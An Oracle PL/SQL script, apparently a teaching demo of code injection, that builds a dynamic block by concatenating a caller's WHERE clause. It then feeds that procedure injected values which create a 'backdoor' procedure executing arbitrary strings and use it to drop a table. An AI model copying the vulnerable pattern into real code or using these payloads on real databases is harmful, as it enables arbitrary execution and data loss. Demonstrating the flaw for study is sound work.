CREATE OR REPLACE PROCEDURE apply_bonus (employee_in IN employees%ROWTYPE)
IS
BEGIN
   DBMS_OUTPUT.put_line (   'Applying bonus to '
                         || employee_in.first_name
                         || ' '
                         || employee_in.last_name
                        );
END apply_bonus;
/

CREATE OR REPLACE PROCEDURE process_emp_rows (where_in IN VARCHAR2)
IS
   l_block   VARCHAR2 (32767)
      :=    'DECLARE TYPE emprows_tt IS TABLE OF employees%ROWTYPE; 
          l_rows emprows_tt;
       BEGIN
          SELECT * BULK COLLECT INTO l_rows FROM employees  
           WHERE '
         || where_in
         || ';
          FOR indx IN 1 .. l_rows.COUNT LOOP
             apply_bonus (l_rows(indx));
          END LOOP;
       END;';
BEGIN
   EXECUTE IMMEDIATE l_block;
EXCEPTION
   WHEN OTHERS
   THEN
      DBMS_OUTPUT.put_line ('Dynamic PL/SQL Error!');
      DBMS_OUTPUT.put_line (DBMS_UTILITY.format_error_stack);
      DBMS_OUTPUT.put_line (DBMS_UTILITY.format_error_backtrace);
      DBMS_OUTPUT.put_line (l_block);
      RAISE;
END process_emp_rows;
/

SET SERVEROUTPUT ON

BEGIN
   process_emp_rows ('department_id = 100');
   process_emp_rows
      ('1<>1; EXECUTE IMMEDIATE 
	      ''CREATE OR REPLACE PROCEDURE backdoor (str VARCHAR2) 
		    AS BEGIN EXECUTE IMMEDIATE str; END;'''
      );
END;
/

BEGIN
   /* Silent drop */
   EXECUTE IMMEDIATE 'DROP TABLE employees_copy';
EXCEPTION
   WHEN OTHERS
   THEN
      DBMS_OUTPUT.put_line (   'Error trying to drop employees_copy: '
                            || DBMS_UTILITY.format_error_stack
                           );
END;
/

CREATE TABLE employees_copy AS SELECT * FROM employees
/

BEGIN
   process_emp_rows (
      '1<>1; backdoor (''DROP TABLE employees_copy'')');
END;
/

SELECT *
  FROM employees_copy
/